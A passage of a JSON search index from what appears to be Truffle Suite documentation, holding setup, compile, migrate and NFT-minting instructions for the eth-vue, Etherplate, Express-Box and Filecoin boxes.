"Install Truffle yarn global add truffle", "title": "Installation"}, {"location": "boxes/eth-vue/#note-if-unboxing-dokwufuluezeeth-vue-had-failed-previously-due-to-absence-of-node-gyp-simply-run-yarn-global-add-node-gyp-or-if-it-failed-due-to-a-problem-with-an-existing-node-gyp-run-node-gyp-rebuild-else-ignore-this-note-and-move-on-to-the-next-instruction", "text": "Enter your development directory [eg. cd into a newly created eth-vue directory] and unbox DOkwufulueze/eth-vue truffle unbox DOkwufulueze/eth-vue Or clone this repository from GitHub and cd into the eth-vue directory: git clone https://github.com/DOkwufulueze/eth-vue.git Configure your environment Open the truffle.js file. You'll find the following: ... module.exports = { ... networks: { development: { host: \"localhost\", port: 8545, // This is the conventional port. If you're using the Ganache Blockchain, change port value to the Ganache default port 7545. If you're using Truffle develop network, change port value to 9545 network_id: \"*\", // Match any network id. You may need to replace * with your network Id from: \"\", // Add your unlocked account within the double quotes gas: 4444444 } } }; Insert your unlocked account within the double-quotes of the from key Open the src/util/constants.js file. You'll find the following: export const NETWORKS = { '1': 'Main Net', '2': 'Deprecated Morden test network', '3': 'Ropsten test network', '4': 'Rinkeby test network', '42': 'Kovan test network', '4447': 'Truffle Develop Network', '5777': 'Ganache Blockchain', '666': 'Daniel Private Blockchain' // This is a test private blockchain. You can change it to your own private blockchain if you have one. }; export const APPROVED_NETWORK_ID = \"3\"; // Default is Ropsten. Set as you choose ... The default network above is the Ropsten network [ APPROVED_NETWORK_ID = '3' ], but you can change this, as Ropsten was chosen for testing purpose only. If your choice network is on the list of NETWORKS but is not Ropsten, then change the value of APPROVED_NETWORK_ID to the ID of your choice network. For example, if one is to use the private Blockchain above [ '666': 'Daniel Private Blockchain' ], then APPROVED_NETWORK_ID would be '666' . But if your choice network is not on the NETWORKS list, simply add your network using the existing pattern [ <networkId>: <networkName> ], and change the value of APPROVED_NETWORK_ID to the ID of your choice network. If you're using Ganache, please remember to point your Ethereum provider [Metamask, for example] to a Custom RPC running on port 7545. For Truffle develop network, point your Ethereum provider [Metamask, for example] to a Custom RPC running on port 9545. Install dependencies if necessary. ###### NOTE: If you unboxed this boilerplate from Truffle [ truffle unbox DOkwufulueze/eth-vue ], then running yarn install is not necessary since unboxing installs dependencies by default. But if you cloned this boilerplate from GitHub [ git clone https://github.com/DOkwufulueze/eth-vue.git ], please run yarn install as stated below yarn install", "title": "NOTE: If unboxing DOkwufulueze/eth-vue had failed previously due to absence of node-gyp, simply run yarn global add node-gyp. Or if it failed due to a problem with an existing node-gyp, run node-gyp rebuild. Else ignore this note and move on to the next instruction"}, {"location": "boxes/eth-vue/#compilation-and-migration", "text": "To deploy the contracts, you can either compile and migrate to your custom network as configured in the truffle.js file or you could use the test network and test addresses that truffle 4 provides. Find details for both deployment processes below.", "title": "Compilation and Migration"}, {"location": "boxes/eth-vue/#compile-and-migrate-to-your-custom-network-as-configured-in-trufflejs-for-the-ganache-blockchain-it-runs-on-port-7545-and-doesnt-conflict-with-any-conventional-port-so-edit-your-trufflejs-file-appropriately-before-deploying", "text": "Compile the Contracts [remember to add the --network ropsten option if you didn't change the APPROVED_NETWORK_ID in src/util/constants.js from the default 3 to another id] truffle compile Deploy the compiled contracts [remember to add the --network ropsten option if you didn't change the APPROVED_NETWORK_ID in src/util/constants.js from the default 3 to another id] truffle migrate", "title": "Compile and Migrate to your custom network as configured in truffle.js. [For the Ganache Blockchain, it runs on port 7545 and doesn't conflict with any conventional port. So edit your truffle.js file appropriately before deploying]"}, {"location": "boxes/eth-vue/#compile-and-migrate-to-the-ropsten-test-network-this-is-very-straightforward", "text": "Compile the Contracts on Ropsten truffle compile --network ropsten Deploy the compiled Contracts to Ropsten truffle migrate --network ropsten", "title": "Compile and Migrate to the Ropsten test network [this is very straightforward]"}, {"location": "boxes/eth-vue/#compile-and-migrate-using-the-truffle-develop-environment", "text": "The default port for truffle develop is 9545, so it doesn't conflict with any conventional port. Edit truffle.js appropriately. - Enter the truffle develop environment truffle develop Compile the Contracts compile Deploy the compiled contracts migrate", "title": "Compile and Migrate using the truffle develop environment"}, {"location": "boxes/eth-vue/#launch-the-dapp", "text": "Start the server yarn start The eth-vue DApp should now be running on http://localhost:3001 as you can see from your browser.", "title": "Launch the dApp"}, {"location": "boxes/eth-vue/#and-thats-it-youre-done", "text": "", "title": "And that's it, you're DONE!"}, {"location": "boxes/eth-vue/#please-send-bug-issues-you-may-encounter-to-issues", "text": "", "title": "Please send bug issues you may encounter to Issues"}, {"location": "boxes/eth-vue/#copyleft", "text": "2017 Daniel Okwufulueze", "title": "Copyleft"}, {"location": "boxes/eth-vue/#licence", "text": "This dApp is distributed under the GNU GPL-3.0 licence.", "title": "Licence"}, {"location": "boxes/etherplate/", "text": "Etherplate \u00b6 What is this? \u00b6 This is an example project showing how you can hook up your Ethereum Non-Fungible Tokens (NFTs, ERC721, similar to CryptoKitties) contract in a DApp. It demos web3 events, and is highly opinionated in that it uses Redux, React, React Router, and Bulma. You can rip out of any these or replace them with your favourites (ie. Skeleton.css instead of Bulma, etc.). Etherplate uses OpenZeppelin's fantastic community-audited contracts as a base to implement the ERC721 standard. View Demo \u00b6 View Demo on Netlify (Uses Ropsten testnet) Setup \u00b6 Requires NPM & Direnv \u00b6 Homebrew on Mac OSX: brew install node npm direnv Apt on Linux: apt-get install node npm direnv Install truffle globally: \u00b6 npm install truffle -g Install the local NPM packages: \u00b6 npm install Environment Variables \u00b6 cp .envrc.example .envrc Enter your own twelve random words in the .envrc. Also, we'll leverage Infura's Ethereum Ropsten testnet node, so make sure to set up an account and paste your private key in your .envrc. Use direnv allow to export the env vars into your current terminal shell. Run the Ganache CLI (local EVM) \u00b6 Start up the local Ethereum test node with: npm run ganache (You may need to loosen up the permissions on the file, try chmod 755 scripts/ganache.sh ) Compile the Solidity code \u00b6 Once Ganache is running, in another terminal window compile and migrate the contracts: truffle compile This will deploy the compiled contracts to the network (tip: use --network=ropsten to deploy to Ethereum's Ropsten Testnet, --network=rinkeby for rinkeby, etc) truffle migrate Run the Project \u00b6 Make sure the truffle contracts are compiled and migrated, and ganache is running. Start the Webpack dev server. npm run dev Your server should now be running at http://127.0.0.1:8080 truffle.js & truffle-config.js \u00b6 Why is there both a truffle and truffle-config file? On Windows, truffle-config.js is required. You can safely delete the one you don't need (ie on Mac/Linux you can delete truffle-config.js) Building the Project \u00b6 npm run build Note: Currently we are manually migrating contracts against the Ropsten & Rinkeby testnets, and checking the build into the repo. This is less than ideal. It would be better to use a build script such as the netlify-build.sh file and compile contracts on the server. Running the Tests \u00b6 For the Solidity contract's truffle test suite: truffle test To run the DApp test suite (React components, etc): npm test Toast Messages \u00b6 Examples of a bunch of different looking toast messages to show on an error message, success, info, etc.: toastr.light('test', 'message', { icon: 'info', status: 'info' }) toastr.light('test', 'message', { icon: 'success', status: 'success' }) toastr.light('test', 'message', { icon: 'warning', status: 'warning' }) toastr.success('test', 'message') toastr.info('test', 'message') toastr.warning('test', 'message') toastr.error('test', 'message') TODO: \u00b6 Test w/ Web3-integrated browsers such as Trust Set up a basic server to respond to tokenURI requests and store the tokenURI in the contract ( buyToken() function) Refactor React components to have both presentation and container components Add deepFreeze() to test immutability of Redux reducers Fix issues where we should be unsubscribing / canceling server requests in componentWillUnmount() Rename all services to have -service in the filename Rename all components to use standard React naming scheme: EtherscanButton.jsx instead of etherscan-button.jsx Follow a standard ES6 export pattern (use TokenListItem component code as an example) Nice-to-haves: \u00b6 Offline.js or react-detect-offline to let users know when their network connection is dead Find a way to prevent truffle test from recompiling the contracts each time it is run Store transactionHash in localStorage and call info on it after page refreshes if it isn't in store.getState().tokens pool Remove the build directory from the repo, build server-side on each deploy and possibly use truffle-migrate-off-chain (https://github.com/asselstine/truffle-migrate-off-chain) Test the happy path of filling out the form and purchasing a token via (jest/enzyme) Get circleci branch up and running, put a badge on the README for test runs Demo how ERC721 expects you to store data (such as the JSON response when the tokenURI is requested) as per https://eips.ethereum.org/EIPS/eip-721 (For instance, OpenSea has a server which takes a contract address and tokenID, which then does a GET request to the tokenURI to pull more info (as JSON) about the token (images, name, etc), for example: https://opensea-api.herokuapp.com/events/?asset_contract_address=0x06012c8cf97bead5deae237070f9587f8e7a266d&token_id=389343) Done: \u00b6 ~~Make into a truffle box and submit to trufflesuite~~ ~~BUG: Purchase History only showing some purchases while My Tokens shows more ... ?~~ ~~Show token ID / transaction ID on purchase history and Tokens#show page~~ ~~Make sure 'Purchase History' page works~~ ~~Implement Redux for web3 events~~ ~~Make all React prop types required (isRequired) and provide defaultProps for those that are not~~ ~~Convert all css to scss~~ ~~Improve mobile styling / media query support~~ ~~Deploy to Netlify & Ropsten, use Infura~~ ~~Use a local web3 (1.0.0.beta?) instead of the current MetaMask/browser's web3 instance (which is deprecated)~~ ~~Fix getting duplicate entries when Ropsten returns the BoughtToken event (active subscriber listening for events in browser)~~ ~~New token updated from transaction receipt event is not being added to state properly in realtime~~ ~~Get DApp tests working again~~ ~~On successful purchase, show a message about the new purchase and how it needs to be confirmed by the network, and redirect to show the now confirming token on Purchase History or My Tokens page~~ ~~Instead of 'Loading ...' should say confirming (show # of confirmations?)~~ ~~Race condition: sometimes we do not have the list of accounts from MetaMask on time when page loads (google for onPageLoad code)~~ ~~Mock out a web3 object in the specs~~ ~~Clean up JS in Header.jsx for controlling Bulma link active states~~ ~~Show account balance, network and account address / avatar~~ ~~Finish upgrade path by removing oldNfTokenFactory and in turn get .events.BoughtToken() working again: (Error: The current provider doesn't support subscriptions: MetamaskInpageProvider)~~ ~~Add a price for each token (say 0.03 eth)~~ ~~Toast message to say token purchase was broadcast~~ ~~Link to view on on etherscan~~ ~~If the user switches their MetaMask account or logs out of MetaMask, need to refresh the page or stop/restart event listeners with new wallet address (Long Polling?)~~ Gratitude \u00b6 Big thanks to all of the fantastic open source developers who have made this technology actual, and to Brendan Asselstine for helping kickstart my development with blockchain technologies. Etherplate Wordmark \u00b6 The Etherplate Wordmark is set in Sign Painter: https://typekit.com/fonts/signpainter", "title": "Etherplate"}, {"location": "boxes/etherplate/#etherplate", "text": "", "title": "Etherplate"}, {"location": "boxes/etherplate/#what-is-this", "text": "This is an example project showing how you can hook up your Ethereum Non-Fungible Tokens (NFTs, ERC721, similar to CryptoKitties) contract in a DApp. It demos web3 events, and is highly opinionated in that it uses Redux, React, React Router, and Bulma. You can rip out of any these or replace them with your favourites (ie. Skeleton.css instead of Bulma, etc.). Etherplate uses OpenZeppelin's fantastic community-audited contracts as a base to implement the ERC721 standard.", "title": "What is this?"}, {"location": "boxes/etherplate/#view-demo", "text": "View Demo on Netlify (Uses Ropsten testnet)", "title": "View Demo"}, {"location": "boxes/etherplate/#setup", "text": "", "title": "Setup"}, {"location": "boxes/etherplate/#requires-npm-direnv", "text": "Homebrew on Mac OSX: brew install node npm direnv Apt on Linux: apt-get install node npm direnv", "title": "Requires NPM &amp; Direnv"}, {"location": "boxes/etherplate/#install-truffle-globally", "text": "npm install truffle -g", "title": "Install truffle globally:"}, {"location": "boxes/etherplate/#install-the-local-npm-packages", "text": "npm install", "title": "Install the local NPM packages:"}, {"location": "boxes/etherplate/#environment-variables", "text": "cp .envrc.example .envrc Enter your own twelve random words in the .envrc. Also, we'll leverage Infura's Ethereum Ropsten testnet node, so make sure to set up an account and paste your private key in your .envrc. Use direnv allow to export the env vars into your current terminal shell.", "title": "Environment Variables"}, {"location": "boxes/etherplate/#run-the-ganache-cli-local-evm", "text": "Start up the local Ethereum test node with: npm run ganache (You may need to loosen up the permissions on the file, try chmod 755 scripts/ganache.sh )", "title": "Run the Ganache CLI (local EVM)"}, {"location": "boxes/etherplate/#compile-the-solidity-code", "text": "Once Ganache is running, in another terminal window compile and migrate the contracts: truffle compile This will deploy the compiled contracts to the network (tip: use --network=ropsten to deploy to Ethereum's Ropsten Testnet, --network=rinkeby for rinkeby, etc) truffle migrate", "title": "Compile the Solidity code"}, {"location": "boxes/etherplate/#run-the-project", "text": "Make sure the truffle contracts are compiled and migrated, and ganache is running. Start the Webpack dev server. npm run dev Your server should now be running at http://127.0.0.1:8080", "title": "Run the Project"}, {"location": "boxes/etherplate/#trufflejs-truffle-configjs", "text": "Why is there both a truffle and truffle-config file? On Windows, truffle-config.js is required. You can safely delete the one you don't need (ie on Mac/Linux you can delete truffle-config.js)", "title": "truffle.js &amp; truffle-config.js"}, {"location": "boxes/etherplate/#building-the-project", "text": "npm run build Note: Currently we are manually migrating contracts against the Ropsten & Rinkeby testnets, and checking the build into the repo. This is less than ideal. It would be better to use a build script such as the netlify-build.sh file and compile contracts on the server.", "title": "Building the Project"}, {"location": "boxes/etherplate/#running-the-tests", "text": "For the Solidity contract's truffle test suite: truffle test To run the DApp test suite (React components, etc): npm test", "title": "Running the Tests"}, {"location": "boxes/etherplate/#toast-messages", "text": "Examples of a bunch of different looking toast messages to show on an error message, success, info, etc.: toastr.light('test', 'message', { icon: 'info', status: 'info' }) toastr.light('test', 'message', { icon: 'success', status: 'success' }) toastr.light('test', 'message', { icon: 'warning', status: 'warning' }) toastr.success('test', 'message') toastr.info('test', 'message') toastr.warning('test', 'message') toastr.error('test', 'message')", "title": "Toast Messages"}, {"location": "boxes/etherplate/#todo", "text": "Test w/ Web3-integrated browsers such as Trust Set up a basic server to respond to tokenURI requests and store the tokenURI in the contract ( buyToken() function) Refactor React components to have both presentation and container components Add deepFreeze() to test immutability of Redux reducers Fix issues where we should be unsubscribing / canceling server requests in componentWillUnmount() Rename all services to have -service in the filename Rename all components to use standard React naming scheme: EtherscanButton.jsx instead of etherscan-button.jsx Follow a standard ES6 export pattern (use TokenListItem component code as an example)", "title": "TODO:"}, {"location": "boxes/etherplate/#nice-to-haves", "text": "Offline.js or react-detect-offline to let users know when their network connection is dead Find a way to prevent truffle test from recompiling the contracts each time it is run Store transactionHash in localStorage and call info on it after page refreshes if it isn't in store.getState().tokens pool Remove the build directory from the repo, build server-side on each deploy and possibly use truffle-migrate-off-chain (https://github.com/asselstine/truffle-migrate-off-chain) Test the happy path of filling out the form and purchasing a token via (jest/enzyme) Get circleci branch up and running, put a badge on the README for test runs Demo how ERC721 expects you to store data (such as the JSON response when the tokenURI is requested) as per https://eips.ethereum.org/EIPS/eip-721 (For instance, OpenSea has a server which takes a contract address and tokenID, which then does a GET request to the tokenURI to pull more info (as JSON) about the token (images, name, etc), for example: https://opensea-api.herokuapp.com/events/?asset_contract_address=0x06012c8cf97bead5deae237070f9587f8e7a266d&token_id=389343)", "title": "Nice-to-haves:"}, {"location": "boxes/etherplate/#done", "text": "~~Make into a truffle box and submit to trufflesuite~~ ~~BUG: Purchase History only showing some purchases while My Tokens shows more ... ?~~ ~~Show token ID / transaction ID on purchase history and Tokens#show page~~ ~~Make sure 'Purchase History' page works~~ ~~Implement Redux for web3 events~~ ~~Make all React prop types required (isRequired) and provide defaultProps for those that are not~~ ~~Convert all css to scss~~ ~~Improve mobile styling / media query support~~ ~~Deploy to Netlify & Ropsten, use Infura~~ ~~Use a local web3 (1.0.0.beta?) instead of the current MetaMask/browser's web3 instance (which is deprecated)~~ ~~Fix getting duplicate entries when Ropsten returns the BoughtToken event (active subscriber listening for events in browser)~~ ~~New token updated from transaction receipt event is not being added to state properly in realtime~~ ~~Get DApp tests working again~~ ~~On successful purchase, show a message about the new purchase and how it needs to be confirmed by the network, and redirect to show the now confirming token on Purchase History or My Tokens page~~ ~~Instead of 'Loading ...' should say confirming (show # of confirmations?)~~ ~~Race condition: sometimes we do not have the list of accounts from MetaMask on time when page loads (google for onPageLoad code)~~ ~~Mock out a web3 object in the specs~~ ~~Clean up JS in Header.jsx for controlling Bulma link active states~~ ~~Show account balance, network and account address / avatar~~ ~~Finish upgrade path by removing oldNfTokenFactory and in turn get .events.BoughtToken() working again: (Error: The current provider doesn't support subscriptions: MetamaskInpageProvider)~~ ~~Add a price for each token (say 0.03 eth)~~ ~~Toast message to say token purchase was broadcast~~ ~~Link to view on on etherscan~~ ~~If the user switches their MetaMask account or logs out of MetaMask, need to refresh the page or stop/restart event listeners with new wallet address (Long Polling?)~~", "title": "Done:"}, {"location": "boxes/etherplate/#gratitude", "text": "Big thanks to all of the fantastic open source developers who have made this technology actual, and to Brendan Asselstine for helping kickstart my development with blockchain technologies.", "title": "Gratitude"}, {"location": "boxes/etherplate/#etherplate-wordmark", "text": "The Etherplate Wordmark is set in Sign Painter: https://typekit.com/fonts/signpainter", "title": "Etherplate Wordmark"}, {"location": "boxes/express-box/", "text": "Express-Box \u00b6 To Be Used as Truffle Box Creating API Endpoints for Ethereum Blockchain. We use personalised blockchain for Ethereum BlockChain Development. This personalised blockchain is made in the GanacheCLI. The Smart Contract Written in solidity language is deployed on this Ethereum Blockchain. Smart Contract is Immutable hence, once deployed it can't be changed. A truffle box to serve as the foundation of any Truffle and Express.js dApp. This Box Uses NodeJS(Express JS) to provide API endpoints to the Ethereum Blockchain smart contract so that this smart contract can be used in Android Apps as well. Pre-Requisites 1. NodeJS 2. A Package Manager for NodeJS, such as Yarn or npm (comes pre-installed with NodeJS) 3. GanacheCLI 4. Truffle Installation 1. Install Truffle and Ganache CLI globally. If you prefer, the graphical version of Ganache works as well! npm install -g truffle npm install -g ganache-cli Download the box. This also takes care of installing the necessary dependencies. truffle unbox arvindkalra/express-box Install all the node modules required by running: // install all the node modules using npm npm install or if you prefer yarn //install all the node modules using yarn yarn install Start truffle development console using truffle develop Inside the truffle console run compile to compile the contracts You can see that a new /build folder has been created in the root directory which contains the compiled contracts. Now these contracts need to be deployed on the Blockchain. For this, run migrate inside the truffle development console To run the Express server yarn start or npm start In the browser window open http://localhost:3000/ . Collaborators 1. ARVIND KALRA 2. PRANAV SINGHAL", "title": "Express-Box"}, {"location": "boxes/express-box/#express-box", "text": "To Be Used as Truffle Box Creating API Endpoints for Ethereum Blockchain. We use personalised blockchain for Ethereum BlockChain Development. This personalised blockchain is made in the GanacheCLI. The Smart Contract Written in solidity language is deployed on this Ethereum Blockchain. Smart Contract is Immutable hence, once deployed it can't be changed. A truffle box to serve as the foundation of any Truffle and Express.js dApp. This Box Uses NodeJS(Express JS) to provide API endpoints to the Ethereum Blockchain smart contract so that this smart contract can be used in Android Apps as well. Pre-Requisites 1. NodeJS 2. A Package Manager for NodeJS, such as Yarn or npm (comes pre-installed with NodeJS) 3. GanacheCLI 4. Truffle Installation 1. Install Truffle and Ganache CLI globally. If you prefer, the graphical version of Ganache works as well! npm install -g truffle npm install -g ganache-cli Download the box. This also takes care of installing the necessary dependencies. truffle unbox arvindkalra/express-box Install all the node modules required by running: // install all the node modules using npm npm install or if you prefer yarn //install all the node modules using yarn yarn install Start truffle development console using truffle develop Inside the truffle console run compile to compile the contracts You can see that a new /build folder has been created in the root directory which contains the compiled contracts. Now these contracts need to be deployed on the Blockchain. For this, run migrate inside the truffle development console To run the Express server yarn start or npm start In the browser window open http://localhost:3000/ . Collaborators 1. ARVIND KALRA 2. PRANAV SINGHAL", "title": "Express-Box"}, {"location": "boxes/filecoin/", "text": "Filecoin Box \u00b6 Welcome to the Filecoin box. The goal of this box is to both get you hands-on with all the official Filecoin support available within Truffle and Ganache, and to kick-start your journey into the Filecoin ecosystem and the benefits that robust decentralized storage can bring to your DApps. The context of the box is that of a decentralized art gallery. It comprises both Lotus and IPFS nodes (simulating the process of creating a storage deal), an Ethereum node (for the deployment of the ERC-721 based NFT contracts) and a front-end for viewing the gallery and the assets decentrally stored within. Requirements \u00b6 The Filecoin box has the following requirements: Node.js 12.x or later NPM version 5.2 or later Windows, Linux or MacOS Installation \u00b6 Installation takes place in three parts: - Installing the filecoin box , - (optionally) Installing the Filecoin Network Explorer , and - Installing the front-end gallery Installing the Filecoin Box \u00b6 In a terminal window, start off by installing this box. truffle unbox filecoin npm install Installing the Filecoin Network Explorer \u00b6 The Filecoin Network Explorer can help view data about the Chain, Miners, Markets, and Deals being made on the Lotus and IPFS nodes. The explorer can be installed by opening a new terminal window and running the following. git clone https://github.com/trufflesuite/filecoin-network-inspector cd filecoin-network-inspector git checkout ganache-changes npm install Note that these steps could potentially change as branches are merged into master/main or other updates take place. Installing the Front-End Gallery \u00b6 Open a new terminal window and navigate to the directory where the Filecoin Box was installed in the first step . From there, run: cd ui npm install Box Overview \u00b6 Now that all of the necessary components are installed, this box will allow you to: - Run Lotus and IPFS nodes to store images for your gallery, - Run the Filecoin Network Explorer , - Deploy an NFT Minting contract , - Interact with the Lotus/IPFS nodes and deployed contract , and - View all images uploaded to the gallery contract Lotus/IPFS Node Setup \u00b6 The Lotus and IPFS nodes can be run using either Ganache-CLI or Ganache-UI . Running Filecoin Ganache \u00b6 In a terminal window, navigate to the directory where the Filecoin box is installed. Run the following command. npx ganache filecoin This creates 10 accounts, each loaded with 100 FIL , and displays both their account addresses and associated private keys. Available Accounts ================== ( 0 ) t3rvcqmc5otc3sh3cngqg2ttzcu7ezpco466lbafzaoygxvnzsw7e7n2zbjwhiv5fdzhs6uxm2qckwt6lp5wga ( 100 FIL ) ( 1 ) t3s3la37547tijmoeiep7ktogws3tep2eqrralh7rhi2mpe46q574gceyy467356onblzvwf7ejlelo2rdsg4q ( 100 FIL ) ( 2 ) t3wk7a46e2dcqb7qxeuz2zq7wodwycdgtbgdpr37hhvelfilf5yvssg5xbsolgusqsumomtmtqhnobh4carhyq ( 100 FIL ) ... It also starts the Lotus and IPFS daemons running over http and ws respectively: Lotus RPC listening on 127 .0.0.1:7777 IPFS RPC listening on 127 .0.0.1:5001 Optionally running the Filecoin Ganache GUI \u00b6 An alternative to running Filecoin Ganache via the CLI is to use Filecoin Ganche UI. As per the screenshot below, this exposes all the core Filecoin protocol elements as tabs, which is particularly useful if you're just starting out. Filecoin Ganche UI can be downloaded here . Running the Filecoin Network Explorer \u00b6 The Filecoin Network Explorer can help view data about the Chain, Miners, Markets, and Deals being made on the Lotus and IPFS nodes. It can also be used to facilitate creating storage deals . To run, navigate to its installed location in a terminal window and run: npm run start The Filecoin Network Explorer can now be viewed at http://localhost:3000 Deploying the NFT Minting Contract \u00b6 Deploying the contract will first require an Ethereum node to connect to. A local Ethereum node can be run using Ganache. This will supply the needed wallet and addresses for deploying the contract and owning the NFTs. To run a Ganache node, open a terminal window and run: npx ganache ethereum The following output should be displayed at the end of the log: RPC Listening on 127 .0.0.1:8545 To deploy the contract to the local node, the contract needs to be compiled and migrated. Open a terminal window at the Filecoin box and run: truffle compile followed by truffle migrate Note the address of the deployed contract, as it will be used in setting up the gallery UI . Creating Storage Deals \u00b6 A storage deal is an agreement between a client and a storage miner to store some data in the network for a given duration. Note that while in the case of Filecoin's mainnet, a deal must be secured with a miner before data is stored, in Filecoin Ganache a deal is reached automatically. Via the Filecoin Network Explorer \u00b6 The simplest way to store data, open the Filecoin Network Explorer and navigate to the \"Market\" tab. From here you can select a file by clicking \"Choose File\" followed by \"Upload to the Filecoin Network\". Via Truffle Preserve \u00b6 Truffle now has a preserve command which allows for the 'preservation' of files directly from the Truffle CLI. This is currently experimental and thus on specific branch; installation details available at here . Once installed, you'll be able to preserve your assets via the following command. Note that you'll need to include the environments object in your truffle-config.js to point at the respective node (although these are already preconfigured in the box). truffle preserve --environment development ./assets/ --filecoin For broader help with this command run truffle help preserve . Via Curl (or equivalent) \u00b6 Lastly, you can send the following curl request directly to the Lotus RPC. Note that the you'll need to update both the wallet address ( t3s3la3754... ) and Content Identifier (aka CID) ( QmZTR5bcpQ... ). curl -X POST \\ -H 'Content-Type: application/json' \\ -d '{\"jsonrpc\":\"2.0\",\"id\":0,\"method\":\"Filecoin.ClientStartDeal\",\"params\":[{\"Data\":{\"TransferType\":\"graphsync\",\"Root\":{\"/\":\"QmZTR5bcpQD7cFgTorqxZDYaew1Wqgfbd2ud9QqGPAkK2V\"},\"PieceCid\":null,\"PieceSize\":0},\"Wallet\":\"t3s3la37547tijmoeiep7ktogws3tep2eqrralh7rhi2mpe46q574gceyy467356onblzvwf7ejlelo2rdsg4q\",\"Miner\":\"t01000\",\"EpochPrice\":\"2500\",\"MinBlocksDuration\":300}]}' \\ http://localhost:7777/rpc/v0 Minting an NFT \u00b6 In the example below, we've already created a deal for the 3 assets (metadata, thumbnail, and the original asset respectively) that comprise our NFT. These are as follows, with their corresponding CIDs. metadata ( QmS4t7rFPxaaNriXvCmALr5GYRAtya5urrDaZgkfHutdCG ) thumbnail - ( QmbAAMaGWpiSgmMWYTRtGsru382j6qTVQ4FDKX2cRTRso6 ) asset - ( QmUWFZQrJHfCVNHXVjjb2zeowVvH7dC6rKpbdHsTdnAgvP ) Assuming the local Ethereum Ganache node is running, you'll be able to open a console and mint a new NFT with the following steps. As the base URL is set to that of an IPFS gateway, we'll just need to pass in the CID to the asset metadata. To create your own metadata, you can use the Filecoin Network Explorer to upload a JSON file with the following contents: { \"title\" : \"<NFT Title>\" , \"thumbnail\" : \"<CID of the desired thumbnail>\" , \"media\" : \"<CID of the desired media>\" , \"vintage\" : \"<Date of Creation>\" , \"author\" : \"<Author>\" } From there, the metadata can be minted with: truffle console truffle ( development ) > const gallery = await MyGallery.deployed () truffle ( development ) > gallery.mint ( accounts [ 0 ] , \"<CID of Metadata>\" ) In the above example the owner of the NFT is set (via accounts[0] ) to that of the first account generated by the mnemonic. Transferring Ownership \u00b6 If we want to transfer it to a new owner, we'll be able to do so with the following. truffle console truffle ( development ) > gallery.transferFrom ( accounts [ 0 ] , accounts [ 1 ] , 1 ) Gallery UI \u00b6 A sample gallery interface is available here . To run this locally, open a terminal window at the location that the front-end gallery was installed and run: npm run start Note that this does not display the images uploaded to your local node. Out of the box, the UI pulls from a contract deployed to the Rinkeby testnet. To point to your own contract, navigate to filecoin-box/ui/src/App.js . Find the following section and follow the instructions in the comments: // TODO - comment the following two lines const provider = new ethers . providers . InfuraProvider ( \"rinkeby\" ); const myGallery = \"0x6cb457d583340099CadcBde4E05Eaa32488a6027\" ; // TODO - uncomment the following and update the contract address to that of your local migration //const provider = new ethers.providers.JsonRpcProvider(`http://localhost:8545`); //const myGallery = \"0x9aaec9900de8292b31c5eb0d49644e8456972fc8\"; Rerun the UI server to view your gallery! Support \u00b6 Support for this box is available via the Truffle community available here . In addition, Filecoin support is available here .", "title": "Filecoin Box"}, {"location": "boxes/filecoin/#filecoin-box", "text": "Welcome to the Filecoin box. The goal of this box is to both get you hands-on with all the official Filecoin support available within Truffle and Ganache, and to kick-start your journey into the Filecoin ecosystem and the benefits that robust decentralized storage can bring to your DApps. The context of the box is that of a decentralized art gallery. It comprises both Lotus and IPFS nodes (simulating the process of creating a storage deal), an Ethereum node (for the deployment of the ERC-721 based NFT contracts) and a front-end for viewing the gallery and the assets decentrally stored within.", "title": "Filecoin Box"}, {"location": "boxes/filecoin/#requirements", "text": "The Filecoin box has the following requirements: Node.js 12.x or later NPM version 5.2 or later Windows, Linux or MacOS", "title": "Requirements"}, {"location": "boxes/filecoin/#installation", "text": "Installation takes place in three parts: - Installing the filecoin box , - (optionally) Installing the Filecoin Network Explorer , and - Installing the front-end gallery", "title": "Installation"}, {"location": "boxes/filecoin/#installing-the-filecoin-box", "text": "In a terminal window, start off by installing this box. truffle unbox filecoin npm install", "title": "Installing the Filecoin Box"}, {"location": "boxes/filecoin/#installing-the-filecoin-network-explorer", "text": "The Filecoin Network Explorer can help view data about the Chain, Miners, Markets, and Deals being made on the Lotus and IPFS nodes. The explorer can be installed by opening a new terminal window and running the following. git clone https://github.com/trufflesuite/filecoin-network-inspector cd filecoin-network-inspector git checkout ganache-changes npm install Note that these steps could potentially change as branches are merged into master/main or other updates take place.", "title": "Installing the Filecoin Network Explorer"}, {"location": "boxes/filecoin/#installing-the-front-end-gallery", "text": "Open a new terminal window and navigate to the directory where the Filecoin Box was installed in the first step . From there, run: cd ui npm install", "title": "Installing the Front-End Gallery"}, {"location": "boxes/filecoin/#box-overview", "text": "Now that all of the necessary components are installed, this box will allow you to: - Run Lotus and IPFS nodes to store images for your gallery, - Run the Filecoin Network Explorer , - Deploy an NFT Minting contract , - Interact with the Lotus/IPFS nodes and deployed contract , and - View all images uploaded to the gallery contract", "title": "Box Overview"}, {"location": "boxes/filecoin/#lotusipfs-node-setup", "text": "The Lotus and IPFS nodes can be run using either Ganache-CLI or Ganache-UI .", "title": "Lotus/IPFS Node Setup"}, {"location": "boxes/filecoin/#running-filecoin-ganache", "text": "In a terminal window, navigate to the directory where the Filecoin box is installed. Run the following command. npx ganache filecoin This creates 10 accounts, each loaded with 100 FIL , and displays both their account addresses and associated private keys. Available Accounts ================== ( 0 ) t3rvcqmc5otc3sh3cngqg2ttzcu7ezpco466lbafzaoygxvnzsw7e7n2zbjwhiv5fdzhs6uxm2qckwt6lp5wga ( 100 FIL ) ( 1 ) t3s3la37547tijmoeiep7ktogws3tep2eqrralh7rhi2mpe46q574gceyy467356onblzvwf7ejlelo2rdsg4q ( 100 FIL ) ( 2 ) t3wk7a46e2dcqb7qxeuz2zq7wodwycdgtbgdpr37hhvelfilf5yvssg5xbsolgusqsumomtmtqhnobh4carhyq ( 100 FIL ) ... It also starts the Lotus and IPFS daemons running over http and ws respectively: Lotus RPC listening on 127 .0.0.1:7777 IPFS RPC listening on 127 .0.0.1:5001", "title": "Running Filecoin Ganache"}, {"location": "boxes/filecoin/#optionally-running-the-filecoin-ganache-gui", "text": "An alternative to running Filecoin Ganache via the CLI is to use Filecoin Ganche UI. As per the screenshot below, this exposes all the core Filecoin protocol elements as tabs, which is particularly useful if you're just starting out. Filecoin Ganche UI can be downloaded here .", "title": "Optionally running the Filecoin Ganache GUI"}, {"location": "boxes/filecoin/#running-the-filecoin-network-explorer", "text": "The Filecoin Network Explorer can help view data about the Chain, Miners, Markets, and Deals being made on the Lotus and IPFS nodes. It can also be used to facilitate creating storage deals . To run, navigate to its installed location in a terminal window and run: npm run start The Filecoin Network 